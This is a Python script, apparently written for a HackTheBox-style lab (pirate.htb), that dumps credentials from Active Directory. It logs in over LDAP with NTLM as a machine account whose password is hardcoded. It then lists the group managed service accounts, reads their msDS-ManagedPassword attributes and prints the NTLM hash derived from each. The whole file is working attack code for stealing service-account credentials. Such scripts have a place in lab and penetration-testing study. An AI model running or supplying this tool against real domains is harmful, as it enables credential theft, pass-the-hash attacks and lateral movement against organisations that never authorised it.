#!/usr/bin/env python3
"""Read gMSA passwords using MS01$ machine account via NTLM auth"""

import ldap3
import hashlib
import struct
import sys

DC_IP = '10.129.15.19'
DOMAIN = 'pirate.htb'
USERNAME = 'MS01$'
PASSWORD = 'ms01'

def extract_ntlm_from_managed_password(blob):
    """Extract NTLM hash from msDS-ManagedPassword blob"""
    # MSDS-MANAGEDPASSWORD_BLOB: skip header, password at offset 16, 256 bytes
    current_pwd_offset = struct.unpack('<H', blob[8:10])[0]
    pwd_bytes = blob[current_pwd_offset:current_pwd_offset + 256]
    ntlm = hashlib.new('md4', pwd_bytes).hexdigest()
    return ntlm

try:
    print(f"[*] Connecting to LDAP {DC_IP} as {DOMAIN}\\{USERNAME} via NTLM...")

    server = ldap3.Server(f'ldap://{DC_IP}', get_info=ldap3.ALL)
    conn = ldap3.Connection(
        server,
        user=f'{DOMAIN}\\{USERNAME}',
        password=PASSWORD,
        authentication=ldap3.NTLM,
        auto_bind=True
    )
    print(f"[+] Connected! Bound as: {conn.extend.standard.who_am_i()}")

    print("[*] Searching for gMSA accounts...")
    conn.search(
        search_base='DC=pirate,DC=htb',
        search_filter='(objectClass=msDS-GroupManagedServiceAccount)',
        attributes=['sAMAccountName', 'msDS-ManagedPassword']
    )

    for entry in conn.entries:
        name = entry.sAMAccountName.value
        print(f"\n[+] Account: {name}")
        try:
            pwd_blob = entry['msDS-ManagedPassword'].raw_values[0]
            if pwd_blob:
                ntlm = extract_ntlm_from_managed_password(pwd_blob)
                print(f"[+] NTLM Hash: {ntlm}")
            else:
                print("[-] Empty msDS-ManagedPassword")
        except Exception as e:
            print(f"[-] Cannot read msDS-ManagedPassword: {e}")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
